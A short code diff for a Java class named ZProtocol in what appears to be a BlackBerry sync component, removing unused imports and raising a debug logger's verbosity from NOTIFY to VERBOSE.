@@ -5,17 +5,14 @@ import java.io.EOFException;
 import java.util.Date;
 import java.util.Vector;
 
-import net.rim.device.api.crypto.Crypto;
 import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.crypto.SHA1Digest;
-import net.rim.device.api.util.ByteVector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
-import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -33,7 +30,7 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.NOTIFY);
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
